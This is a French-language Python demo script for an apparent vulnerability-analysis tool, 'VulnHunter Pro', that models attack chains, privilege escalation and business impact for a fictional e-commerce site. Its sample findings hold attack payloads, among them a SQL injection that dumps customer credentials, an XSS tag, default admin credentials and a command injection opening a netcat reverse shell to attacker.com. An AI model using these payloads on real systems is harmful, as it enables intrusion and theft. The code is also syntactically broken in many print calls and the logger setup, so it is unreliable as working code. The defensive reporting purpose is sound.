#!/usr/bin/env python3
"""
Démonstration des chaînes d'attaque VulnHunter Pro
Attack trees automatiques, privilege escalation, lateral movement, business impact
"""
import asyncio
import sys
from pathlib import Path
import json

sys.path.insert(0, str(Path(__file__).parent))

from core.attack_chains import OrchestrateurChainesAttaque
from core.models import Vulnerabilite
from loguru import logger

logger.remove()
logger.add(lambda msg: print(msg, end=''), colorize=True, format("<green>{time:HH:mm:ss}</green> | <level>{level: <8></level> | <level>{message}</level>")


async def demo_attack_chains():
    """Démonstration complète des chaînes d'attaque"""
    print("🔗 VULNHUNTER PRO - DÉMONSTRATION CHAÎNES D'ATTAQUE")
    print("=" * 85)
    print("🎯 Scénario: Analyse complète d'une compromission e-commerce")
    print("🎯 Objectif: Montrer les arbres d'attaque, escalade, mouvement latéral")
    print("🎯 Résultat: Rapport stratégique avec impacts business et priorités")
    print()

    # Scénario réaliste d'attaque sur un site e-commerce
    vulnerabilites_scenario = [
        # Phase initiale: Accès web
        Vulnerabilite(
            type="SQL Injection",
            severite="CRITIQUE",
            url="https://ecommerce.example.com/products/search",
            description="Injection SQL dans la recherche produits - accès base de données clients",
            payload="1' UNION SELECT username,password,email FROM customers--",
            preuve="Extraction de 5000 comptes clients avec données de carte",
            outil_source="VulnHunter SQL Scanner"
        ),

        Vulnerabilite(
            type="XSS Stored",
            severite="ÉLEVÉ",
            url="https://ecommerce.example.com/reviews",
            description="XSS stocké dans le système d'avis clients",
            payload="<script>stealSession()</script>",
            preuve="Payload exécuté sur 1200 sessions utilisateurs",
            outil_source="VulnHunter XSS Scanner"
        ),

        # Phase d'authentification
        Vulnerabilite(
            type="Weak Password Policy",
            severite="ÉLEVÉ",
            url="https://ecommerce.example.com/admin/login",
            description="Politique mots de passe faible + comptes admin par défaut",
            payload="admin:admin123",
            preuve="Accès panneau admin avec credentials par défaut",
            outil_source="VulnHunter Auth Scanner"
        ),

        # Phase de mouvement latéral
        Vulnerabilite(
            type="Command Injection",
            severite="CRITIQUE",
            url="https://ecommerce.example.com/admin/backup",
            description="Injection de commandes dans le système de sauvegarde",
            payload="; nc -e /bin/sh attacker.com 4444",
            preuve="Reverse shell établi vers serveur attaquant",
            outil_source="VulnHunter RCE Scanner"
        ),

        Vulnerabilite(
            type="Privilege Escalation",
            severite="CRITIQUE",
            url="https://ecommerce.example.com/system",
            description="Escalade vers root via service vulnérable",
            payload="Dirty COW exploit",
            preuve="Accès root obtenu, contrôle total du serveur",
            outil_source="VulnHunter PrivEsc Scanner"
        ),

        # Phase d'exfiltration
        Vulnerabilite(
            type="Weak Encryption",
            severite="MOYEN",
            url="https://ecommerce.example.com/api/payments",
            description="Chiffrement des données de paiement insuffisant",
            payload="",
            preuve="Clés de chiffrement récupérables en 2 heures",
            outil_source="VulnHunter Crypto Scanner"
        ),

        Vulnerabilite(
            type="Information Disclosure",
            severite="MOYEN",
            url="https://ecommerce.example.com/.git/config",
            description="Dépôt Git exposé avec historique complet",
            payload="",
            preuve="Code source et configurations sensibles exposés",
            outil_source="VulnHunter InfoDisc Scanner"
        )
    ]

    print(f"🛒 Scénario e-commerce compromis: {len(vulnerabilites_scenario)} vulnérabilités interconnectées")
    print("   • Injection SQL → Vol de données clients")
    print("   • XSS → Hijacking de sessions")
    print("   • Auth faible → Accès admin")
    print("   • RCE → Contrôle système")
    print("   • Escalade → Accès root")
    print("   • Chiffrement faible → Exfiltration possible")
    print()

    # Contexte business réaliste
    contexte_business = {
        'secteur': 'ecommerce',
        'taille_entreprise': 'enterprise',      # Grande entreprise
        'criticite_donnees': 'critical',        # Données clients sensibles
        'chiffre_affaires_annuel': 50000000,    # 50M€/an
        'nombre_clients': 500000,              # 500k clients
        'reputation_brand': 'premium',          # Marque premium
        'presence_internationale': True,        # Présence mondiale
        'dependance_digital': 'high'            # Forte dépendance numérique
    }

    # Contexte menaces
    contexte_menaces = {
        'threat_skill_level': 'expert',         # Attaquants experts
        'threat_motive': 'financial',           # Motivation financière
        'threat_opportunity': 'realistic',      # Opportunité réaliste
        'threat_size': 'organized_crime',       # Crime organisé
        'attack_persistence': 'high',           # Persistance élevée
        'stealth_requirement': 'medium',        # Discrétion moyenne
        'time_available': 'unlimited',          # Temps illimité
        'resources_attacker': 'high'            # Ressources élevées
    }

    contexte_complet = {**contexte_business, **contexte_menaces}

    print("🎯 CONTEXTE D'ANALYSE COMPLEXE:")
    print("-" * 40)
    print(f"   🏢 Entreprise: {contexte_business['secteur']} {contexte_business['taille_entreprise']}")
    print(",.0f"    print(f"   👥 Clients: {contexte_business['nombre_clients']:,} ({contexte_business['criticite_donnees']} criticité)")
    print(f"   🌍 Présence: {'Internationale' if contexte_business['presence_internationale'] else 'Locale'}")
    print()
    print(f"   🦹 Attaquants: {contexte_menaces['threat_skill_level']} ({contexte_menaces['threat_size']})")
    print(f"   🎯 Motivation: {contexte_menaces['threat_motive']} (persistence: {contexte_menaces['attack_persistence']})")
    print(f"   ⏱️ Temps disponible: {contexte_menaces['time_available']}")
    print(f"   💪 Ressources: {contexte_menaces['resources_attacker']}")
    print()

    # Lancement de l'analyse complète
    print("🚀 ANALYSE DE CHAÎNES D'ATTAQUE EN COURS...")
    print("-" * 55)

    orchestrateur = OrchestrateurChainesAttaque()
    rapport_chaines = await orchestrateur.analyser_chaine_complete(
        vulnerabilites_scenario, contexte_complet
    )

    print("✅ ANALYSE COMPLÈTE TERMINÉE - CHAÎNES D'ATTAQUE RECONSTRUITES")
    print()

    # RAPPORT STRATÉGIQUE
    print("📋 RAPPORT STRATÉGIQUE - ANALYSE DE CHAÎNES D'ATTAQUE")
    print("=" * 70)

    print(f"📅 Date d'analyse: {rapport_chaines['date_analyse'][:10]}")
    print(f"🎯 Vulnérabilités analysées: {rapport_chaines['total_vulnerabilites']}")
    print(f"🌲 Chaînes d'attaque identifiées: {len(rapport_chaines['chaines_identifiees'])}")
    print()

    # ANALYSE DE LA CHAÎNE PRINCIPALE
    print("🌲 ANALYSE DE LA CHAÎNE D'ATTAQUE PRINCIPALE")
    print("-" * 50)

    if rapport_chaines['chaines_identifiees']:
        chaine_principale = rapport_chaines['chaines_identifiees'][0]

        print(f"🆔 ID Chaîne: {chaine_principale['id_chaine']}")
        print("🎯 MÉTRIQUES DE RISQUE:"        print(f"   📊 Score global: {chaine_principale['score_global']:.1f}/100")
        print(f"   🚨 Niveau de risque: {chaine_principale['niveau_risque'].upper()}")
        print(f"   📈 Probabilité de succès: {chaine_principale['probabilite_succes']:.1%}")
        print(f"   🎯 Objectifs atteints: {len(chaine_principale['objectifs_atteints'])}")
        print(f"   🌲 Nœuds critiques: {chaine_principale['noeuds_critiques']}")

        print("
🎯 OBJECTIFS ATTEINTS PAR L'ATTAQUANT:"        objectifs = chaine_principale['objectifs_atteints']
        if objectifs:
            for i, objectif in enumerate(objectifs[:3], 1):
                print(f"   {i}. {objectif}")
        else:
            print("   Aucun objectif critique identifié")
    print()

    # ANALYSE ESCALADE DE PRivilèGES
    print("🔑 ANALYSE ESCALADE DE PRivilèGES")
    print("-" * 40)

    escalade = rapport_chaines['analyse_escalade']

    print(f"👑 Niveau de privilège maximum atteint: {escalade['niveau_privilege_max_atteint']}")
    print(f"📈 Probabilité d'escalade réussie: {escalade['probabilite_escalade']:.1%}")

    if escalade['chemins_escalade_identifies']:
        print("
🛣️ CHEMINS D'ESCALADE IDENTIFIÉS:"        for chemin in escalade['chemins_escalade_identifies'][:2]:
            print(f"   • {chemin['type'].replace('_', ' ').title()}")
            print(f"     Étapes: {' → '.join([etape['to'] for etape in chemin['etapes']])}")
            print(f"     Probabilité: {chemin['probabilite']:.1%}")
    else:
        print("   ✅ Aucun chemin d'escalade critique identifié")

    if escalade['recommandations_securite']:
        print("
🛡️ RECOMMANDATIONS SÉCURITÉ:"        for rec in escalade['recommandations_securite'][:3]:
            print(f"   • {rec}")
    print()

    # ANALYSE MOUVEMENT LATÉRAL
    print("🌐 ANALYSE MOUVEMENT LATÉRAL")
    print("-" * 35)

    lateral = rapport_chaines['analyse_laterale']

    print(f"🛣️ Techniques de mouvement latéral possibles: {len(lateral['techniques_laterales_possibles'])}")
    print(f"📊 Impact de propagation réseau: {lateral['impact_propagation']:.1f}/10")

    if lateral['techniques_laterales_possibles']:
        print("
🎯 TECHNIQUES LATÉRALES APPLICABLES:"        for tech in lateral['techniques_laterales_possibles'][:3]:
            print(f"   • {tech['technique'].replace('_', ' ').title()}")
            print(f"     Impact: {tech['impact']} | Détection: {tech['detection_difficulty']}")
            print(f"     Score applicabilité: {tech['score_applicabilite']:.1%}")
    else:
        print("   ✅ Aucune technique latérale critique applicable")

    if lateral['recommandations_containment']:
        print("
🚫 RECOMMANDATIONS CONTAINMENT:"        for rec in lateral['recommandations_containment'][:3]:
            print(f"   • {rec}")
    print()

    # IMPACT BUSINESS DÉTAILLÉ
    print("💰 IMPACT BUSINESS DÉTAILLÉ")
    print("-" * 35)

    impact = rapport_chaines['impact_business']

    print("💸 COÛTS ESTIMÉS:"    print(",.0f"    print(",.0f"    print(",.0f"    print(f"⏱️ Durée d'indisponibilité: {impact['duree_indisponibilite']} heures")

    if impact['consequences_strategiques']:
        print("
🎯 CONSÉQUENCES STRATÉGIQUES:"        for consequence in impact['consequences_strategiques'][:4]:
            print(f"   • {consequence}")

    print("
📈 SCÉNARIOS DE RISQUE:"    scenarios = impact['scenarios_risque']
    for scenario in scenarios:
        print(f"   • {scenario['nom']}")
        print(",.0f"        print(f"     Durée crise: {scenario['duree_crise']} heures")
        if scenario['consequences']:
            print(f"     Impact: {scenario['consequences'][0]}")

    print()

    # PRIORITÉS DE REMÉDIATION
    print("🎯 PRIORITÉS DE REMÉDIATION")
    print("-" * 35)

    priorites = rapport_chaines['priorites_remediation']

    # Grouper par niveau de priorité
    priorites_par_niveau = {}
    for p in priorites:
        niveau = p['niveau_priorite']
        if niveau not in priorites_par_niveau:
            priorites_par_niveau[niveau] = []
        priorites_par_niveau[niveau].append(p)

    niveaux_ordre = ['critical', 'high', 'medium', 'low']

    for niveau in niveaux_ordre:
        if niveau in priorites_par_niveau:
            vulns = priorites_par_niveau[niveau]
            emoji = {'critical': '🔴', 'high': '🟠', 'medium': '🟡', 'low': '🟢'}.get(niveau, '❓')

            print(f"{emoji} PRIORITÉ {niveau.upper()}: {len(vulns)} vulnérabilités")
            for vuln in vulns[:2]:  # Top 2 par priorité
                print(f"   • {vuln['vulnerabilite']} (Score: {vuln['score_priorite']:.1f})")
                print(f"     ⏱️ Délai: {vuln['temps_recommande']}")
                if vuln['actions_cle']:
                    print(f"     🛠️ Action: {vuln['actions_cle'][0]}")
            print()

    # RECOMMANDATIONS STRATÉGIQUES
    print("💡 RECOMMANDATIONS STRATÉGIQUES")
    print("-" * 40)

    recommandations = rapport_chaines['recommandations_globales']

    if recommandations:
        print("🎯 ACTIONS IMMÉDIATES RECOMMANDÉES:")
        for i, rec in enumerate(recommandations[:5], 1):
            print(f"   {i}. {rec}")
    else:
        print("✅ Profil de sécurité acceptable - maintenir la surveillance")

    print()

    # RÉSUMÉ EXECUTIVE
    print("🎯 RÉSUMÉ EXECUTIVE - CHAÎNES D'ATTAQUE")
    print("=" * 50)

    # Calculs pour le résumé
    chaine_principale = rapport_chaines['chaines_identifiees'][0] if rapport_chaines['chaines_identifiees'] else {}
    impact_total = impact['cout_total_estime'] + impact['pertes_financieres']
    priorites_critiques = len(priorites_par_niveau.get('critical', []))

    print("🚨 SITUATION CRITIQUE:"    print(f"   • Score de chaîne d'attaque: {chaine_principale.get('score_global', 0):.1f}/100")
    print(f"   • Probabilité de compromission: {chaine_principale.get('probabilite_succes', 0):.1%}")
    print(",.0f"    print(f"   • {priorites_critiques} vulnérabilités à corriger en urgence")
    print()

    print("💰 IMPACT FINANCIER:"    print(",.0f"    print(f"   • Durée d'indisponibilité: {impact['duree_indisponibilite']} heures")
    print(f"   • Perte de réputation: {impact['impact_reputation']:.0f}€")
    print()

    print("🛡️ RISQUES TECHNIQUES:"    print(f"   • Escalade vers: {escalade['niveau_privilege_max_atteint']}")
    print(f"   • Propagation réseau: {lateral['impact_propagation']:.1f}/10")
    print(f"   • Techniques latérales: {len(lateral['techniques_laterales_possibles'])}")
    print()

    print("⏱️ PLAN D'ACTION:"    print("   1. Corriger immédiatement les 2 vulnérabilités critiques")
    print("   2. Implémenter segmentation réseau d'urgence")
    print("   3. Renforcer surveillance et détection d'intrusion")
    print("   4. Préparer plan de communication de crise")
    print("   5. Audit de sécurité indépendant dans 30 jours")
    print()

    print("=" * 85)
    print("🎉 ANALYSE DE CHAÎNES D'ATTAQUE TERMINÉE - RAPPORT STRATÉGIQUE COMPLET !")
    print("=" * 85)
    print()
    print("🌲 VulnHunter Pro a reconstruit les vraies chaînes d'attaque !")
    print("🔑 Analyse d'escalade de privilèges réalisée !")
    print("🌐 Mouvement latéral cartographié !")
    print("💰 Impact business quantifié !")
    print("🎯 Priorités de remédiation définies !")
    print()
    print("🏆 VulnHunter Pro atteint le niveau stratégique !")
    print("🎯 Analyse prédictive de menaces activée !")
    print("🔗 Connexion sécurité-business établie !")
    print()
    print("✨ Félicitations pour cette analyse de chaînes d'attaque révolutionnaire ! 🎉")


async def demo_rapport_attack_tree():
    """Démonstration de génération d'arbre d'attaque JSON"""
    print("\n\n🌲 RAPPORT ARBRE D'ATTAQUE JSON")
    print("=" * 40)

    # Simulation d'un arbre d'attaque simple
    arbre_json = {
        "id_chaine": "attack_chain_demo_123",
        "score_global": 78.5,
        "niveau_risque": "high",
        "probabilite_succes": 0.85,
        "noeuds": [
            {
                "id": "sql_injection_entry",
                "type": "VULNERABILITE",
                "nom": "SQL Injection",
                "impact_business": 8.5,
                "probabilite_succes": 0.9
            },
            {
                "id": "db_access",
                "type": "ACCES",
                "nom": "Database Access",
                "niveau_privilege": "db_user"
            },
            {
                "id": "data_breach",
                "type": "DONNEE",
                "nom": "Data Breach",
                "impact_business": 10.0
            }
        ],
        "connexions": [
            ["sql_injection_entry", "db_access"],
            ["db_access", "data_breach"]
        ],
        "objectifs_atteints": ["Data Breach", "Financial Loss"]
    }

    print("📋 Structure d'arbre d'attaque généré:")
    print(json.dumps(arbre_json, indent=2, ensure_ascii=False))

    print("\n✅ Arbre d'attaque structuré prêt pour visualisation !")


async def main():
    await demo_attack_chains()
    await demo_rapport_attack_tree()


if __name__ == "__main__":
    asyncio.run(main())
